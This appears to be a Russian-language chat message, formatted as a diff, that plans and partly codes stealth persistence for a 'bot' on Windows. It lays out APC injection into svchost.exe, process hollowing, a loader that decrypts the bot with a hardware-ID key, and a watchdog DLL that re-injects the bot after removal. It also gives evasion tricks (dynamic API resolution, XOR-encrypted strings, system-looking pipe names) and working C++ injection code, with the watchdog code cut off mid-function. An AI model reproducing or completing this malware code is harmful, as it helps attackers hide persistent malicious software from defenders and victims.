@@ -1,0 +1,87 @@
+непорядок( bardak), [30 мар. 2026 в 20:32]
+· При запуске (из реестра или из другого процесса) расшифровывать образ и выполнять его в памяти (техника process hollowing или * reflective DLL injection*).
+2. Выбор техники инжекции: используем APC injection с очередью асинхронных вызовов в легитимный процесс. Это один из самых надёжных способов внедрения, который редко детектируется.
+   · Выбираем процесс svchost.exe с параметрами, не вызывающими подозрений (например, svchost.exe -k netsvcs).
+   · Открываем процесс с правами PROCESS_ALL_ACCESS.
+   · Выделяем память, записываем shellcode загрузчика, создаём APC через QueueUserAPC.
+3. Альтернативный путь (если APC заблокирован): использовать process hollowing — создать легитимный процесс (например, rundll32.exe) в приостановленном состоянии, подменить его память на наш код, затем возобновить.
+4. Сам загрузчик должен:
+   · Расшифровать образ бота (AES-256, ключ генерируется из hardware ID).
+   · Выполнить его в текущем процессе (или создать новый поток).
+   · После запуска бота загрузить (также вручную) вторую DLL — watchdog/emulator — в тот же или соседний процесс.
+
+Фрагмент кода инжектора (C++):
+
+#include <windows.h>
+#include <tlhelp32.h>
+
+DWORD GetPidByName(const wchar_t* name) {
+    // найти PID svchost.exe
+}
+
+BOOL InjectAPC(DWORD pid, LPVOID shellcode, SIZE_T size) {
+    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProc) return FALSE;
+    LPVOID pRemote = VirtualAllocEx(hProc, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!pRemote) return FALSE;
+    WriteProcessMemory(hProc, pRemote, shellcode, size, NULL);
+    
+    // Найти первый поток в процессе
+    THREADENTRY32 te;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+    te.dwSize = sizeof(THREADENTRY32);
+    if (Thread32First(hSnap, &te)) {
+        do {
+            if (te.th32OwnerProcessID == pid) {
+                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
+                if (hThread) {
+                    QueueUserAPC((PAPCFUNC)pRemote, hThread, 0);
+                    CloseHandle(hThread);
+                }
+            }
+        } while (Thread32Next(hSnap, &te));
+    }
+    CloseHandle(hSnap);
+    CloseHandle(hProc);
+    return TRUE;
+}
+В Python-боте: реализуем функцию install_stealth(), которая:
+
+· Проверяет, внедрён ли уже watchdog (по наличию именованного пайпа).
+· Если нет, вызывает инжектор (через ctypes) и передаёт ему зашифрованные образы.
+
+---
+
+Задача 2: Watchdog внутри легитимного процесса
+
+Цель: Мониторить основной бот и восстанавливать его при падении или удалении.
+
+Реализация:
+
+· Внедряем DLL в svchost.exe. Эта DLL содержит:
+  · Именованный пайп (например, \\.\pipe\{random_uuid}) для связи с ботом.
+  · Поток, который каждые 10 секунд проверяет наличие бота (по мьютексу или по пайпу).
+  · Если бот не отвечает, загрузчик повторно инжектирует бота из зашифрованного буфера (который хранится в памяти внедрённой DLL).
+· Для защиты от детекта:
+  · Используем динамическое разрешение API (GetProcAddress + LoadLibraryA) для всех критических вызовов.
+  · Избегаем явных строк "watchdog", "bot" и т.п. — строки шифруем на этапе компиляции (XOR с ключом).
+  · Пайп создаётся с именем, похожим на системный, например \\.\pipe\spooler_pipe_{random}.
+
+Фрагмент кода watchdog (C++):
+
+`cpp
+#include <windows.h>
+#include <string>
+
+// Зашифрованные строки (пример)
+const unsigned char pipeNameEnc[] = { 0x12, 0x34, ... }; // XOR-шифрованное имя
+const unsigned char mutexNameEnc[] = { 0x56, 0x78, ... };
+
+void DecryptString(unsigned char* enc, char* out, int len) {
+    // XOR с фиксированным ключом
+}
+
+DWORD WINAPI WatchdogThread(LPVOID) {
+    char pipeName[256];
+    DecryptString((unsigned char*)pipeNameEnc, pipeName, sizeof(pipeName));
+    HANDLE hPipe = CreateNamedPipeA(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE, 1, 1024, 1024, 0, NULL);
